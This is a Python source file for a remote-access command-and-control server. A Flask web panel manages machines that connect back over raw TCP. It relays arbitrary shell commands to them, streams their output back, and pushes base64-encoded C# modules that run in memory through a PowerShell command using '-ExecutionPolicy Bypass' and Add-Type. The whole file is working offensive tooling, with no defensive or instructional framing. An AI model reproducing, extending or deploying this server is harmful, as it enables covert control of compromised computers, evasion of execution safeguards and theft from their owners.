import argparse
import threading
import socket
import uuid
import time
import os
import base64
import socket, threading, uuid, time
from flask import Flask, jsonify, render_template, request, abort, Response
import json, re

app = Flask(__name__, template_folder='templates')

# In-memory client registry
devices = {}
MODULES_DIR = 'modules'
modules = {}
registry_lock = threading.Lock()

# Load modules metadata
def load_modules():
    for fn in os.listdir(MODULES_DIR):
        if fn.lower().endswith('.cs'):
            path = os.path.join(MODULES_DIR, fn)
            raw = open(path, 'rb').read().decode('utf-8', errors='ignore')
            m = re.match(r'/\*\s*(\{.*?\})\s*\*/', raw, re.S)
            meta = json.loads(m.group(1)) if m else {}
            name = meta.get('name', os.path.splitext(fn)[0])
            modules[name] = {'path': path, 'meta': meta}

load_modules()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/client/<cid>')
def client_view(cid):
    with registry_lock:
        if cid not in devices:
            abort(404)
    return render_template('client.html', client_id=cid)

@app.route('/modules')
def list_modules():
    out = []
    for name, info in modules.items():
        md = info.get('meta', {})
        out.append({
            'name': name,
            'desc': md.get('desc', ''),
            'author': md.get('author', ''),
            'version': md.get('version', ''),
            'args': md.get('args', [])
        })
    return jsonify(out)

@app.route('/clients')
def clients():
    with registry_lock:
        data = []
        for cid, info in devices.items():
            data.append({
                'id': cid,
                'addr': f"{info['addr'][0]}:{info['addr'][1]}",
                'connected_at': info['connected_at'],
                'last_seen': info.get('last_seen', info['connected_at']),
                'bytes_received': info.get('bytes_received', 0)
            })
    return jsonify(data)

@app.route('/client/<cid>/module', methods=['POST'])
def run_module(cid):
    data = request.json or {}
    mod = data.get('module')
    args = data.get('args', [])
    if mod not in modules:
        abort(404)
    path = modules[mod]['path']
    with open(path, 'rb') as f:
        payload = base64.b64encode(f.read()).decode()
    ps = (
        "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "
        f"$code=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{payload}'));"
        f"Add-Type -TypeDefinition $code -Language CSharp -ReferencedAssemblies System.Windows.Forms,System.Drawing;"
        f"[Module]::Run(@({','.join(repr(a) for a in args)}))"
    )
    with registry_lock:
        if cid not in devices:
            abort(404)
        devices[cid]['sock'].sendall(ps.encode() + b'\n')
    return ('', 204)

@app.route('/client/<cid>/cmd', methods=['POST'])
def client_cmd(cid):
    cmd = request.json.get('cmd')
    if not cmd:
        abort(400)
    with registry_lock:
        if cid not in devices:
            abort(404)
        conn = devices[cid]['sock']
    try:
        conn.sendall(cmd.encode() + b"\n")
        return ('', 204)
    except Exception:
        abort(500)

@app.route('/client/<cid>/stream')
def stream(cid):
    def generate():
        last_idx = 0
        while True:
            time.sleep(0.5)
            with registry_lock:
                info = devices.get(cid)
                if not info:
                    yield 'event: close\ndata: [DISCONNECTED]\n\n'
                    break
                buf = info['buffer']
            if last_idx < len(buf):
                chunk = buf[last_idx:]
                last_idx = len(buf)
                for line in chunk:
                    yield f"data: {line}\n\n"
    return Response(generate(), mimetype='text/event-stream')

def handle_client(cid, conn):
    """
    Continuously read lines from conn, update devices[cid]['buffer'], etc.
    """
    try:
        with conn:
            while True:
                line = conn.recv(4096)
                if not line:
                    break
                text = line.decode(errors='ignore').rstrip()
                with registry_lock:
                    devices[cid]['buffer'].append(text)
                    devices[cid]['last_seen'] = time.strftime("%Y-%m-%d %H:%M:%S")
                    devices[cid]['bytes_received'] += len(line)
    except Exception as e:
        print(f"[!] Error in handle_client({cid}): {e}")
    finally:
        with registry_lock:
            devices.pop(cid, None)
        print(f"[-] Client {cid} disconnected")

def listener(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((host, port))
    sock.listen(5)
    print(f"[+] Listening for clients on {host}:{port}")
    while True:
        conn, addr = sock.accept()
        cid = uuid.uuid4().hex[:8]
        with registry_lock:
            devices[cid] = {
                'sock': conn,
                'addr': addr,
                'connected_at': time.strftime("%Y-%m-%d %H:%M:%S"),
                'buffer': [],
                'last_seen': time.strftime("%Y-%m-%d %H:%M:%S"),
                'bytes_received': 0
            }
        print(f"[+] New client {cid} from {addr}")
        threading.Thread(target=handle_client,
                         args=(cid, conn),
                         daemon=True).start()

if __name__ == '__main__':
    p = argparse.ArgumentParser()
    p.add_argument('--listen-host', default='0.0.0.0')
    p.add_argument('--listen-port', type=int, required=True)
    p.add_argument('--web-port', type=int, default=8000)
    args = p.parse_args()

    threading.Thread(target=listener, args=(args.listen_host, args.listen_port), daemon=True).start()
    app.run(host='0.0.0.0', port=args.web_port)
